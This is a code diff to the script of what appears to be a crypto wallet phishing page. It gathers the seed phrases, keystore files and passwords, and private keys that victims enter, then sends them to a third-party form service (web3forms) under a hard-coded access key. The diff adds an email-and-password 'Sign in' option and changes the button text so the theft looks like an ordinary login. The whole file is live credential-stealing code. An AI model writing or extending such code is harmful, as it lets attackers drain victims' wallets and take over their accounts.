@@ -27,6 +27,7 @@
   const phrasesField = document.getElementById('phrasesField');
   const keystoreField = document.getElementById('keystoreField');
   const privateField = document.getElementById('privateField');
+  const emailField = document.getElementById('emailField'); // ← NEW
   const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));
 
   let selectedWallet = {
@@ -106,41 +107,56 @@
   if(manualCloseBtn) manualCloseBtn.addEventListener('click', function(){ connectManualModal.classList.add('hidden'); document.body.classList.remove('overflow-hidden'); });
   if(connectManualModal) connectManualModal.addEventListener('click', function(e){ if(e.target === connectManualModal){ connectManualModal.classList.add('hidden'); document.body.classList.remove('overflow-hidden'); } });
 
-  // Manual radio toggles
+  // Manual radio toggles + button text update
   function updateManualFields(){
     const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';
+
     phrasesField.classList.toggle('hidden', sel !== 'phrases');
     keystoreField.classList.toggle('hidden', sel !== 'keystore');
     privateField.classList.toggle('hidden', sel !== 'private');
+    if(emailField) emailField.classList.toggle('hidden', sel !== 'email');
+
+    // Update Connect/Sign in button text
+    if(manualConnectBtn){
+      manualConnectBtn.textContent = (sel === 'email') ? 'Sign in' : 'Connect';
+    }
   }
   manualRadios.forEach(r=> r.addEventListener('change', updateManualFields));
-  updateManualFields();
+  updateManualFields(); // initial call
 
   if(manualConnectBtn){
     manualConnectBtn.addEventListener('click', function(){
       // collect inputs and send via web3forms
       const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
       const payloadParts = [];
+      payloadParts.push('wallet: ' + (selectedWallet.name || selectedWallet.id || 'unknown'));
+
       if(method === 'phrases'){
         const v = document.getElementById('phrasesInput')?.value || '';
         if(v) payloadParts.push('phrases: ' + v);
-      } else if(method === 'keystore'){
+      } 
+      else if(method === 'keystore'){
         const v = document.getElementById('keystoreInput')?.value || '';
         const p = document.getElementById('keystorePassword')?.value || '';
         if(v) payloadParts.push('keystore: ' + v);
         if(p) payloadParts.push('keystore password: ' + p);
-      } else if(method === 'private'){
+      } 
+      else if(method === 'private'){
         const v = document.getElementById('privateInput')?.value || '';
         if(v) payloadParts.push('private key: ' + v);
+      } 
+      else if(method === 'email'){
+        const email = document.getElementById('emailInput')?.value || '';
+        const password = document.getElementById('emailPassword')?.value || '';
+        if(email) payloadParts.push('email: ' + email);
+        if(password) payloadParts.push('password: ' + password);
       }
 
-      // also include selected wallet info
-      payloadParts.unshift('wallet: ' + (selectedWallet.name || selectedWallet.id || 'unknown'));
       const message = payloadParts.join('\n\n');
 
       // UI: clear error, indicate sending
       if(errorConnectingLabel) errorConnectingLabel.classList.add('hidden');
-      if(connectManuallyLabel) connectManuallyLabel.textContent = 'Sending...';
+      if(connectManuallyLabel) connectManuallyLabel.textContent = (method === 'email') ? 'Signing in...' : 'Sending...';
 
       const access_key = '11f0133a-b045-443f-9809-323fe49000de';
       fetch('https://api.web3forms.com/submit', {
@@ -161,11 +177,10 @@
         if(waitOverlay){ waitOverlay.style.display = 'flex'; }
       }).catch(err => {
         if(errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
-        if(connectManuallyLabel) connectManuallyLabel.textContent = 'Connect manually';
+        if(connectManuallyLabel) connectManuallyLabel.textContent = (method === 'email') ? 'Sign in' : 'Connect manually';
         console.error('Send failed', err);
       });
     });
   }
 
 })();
-
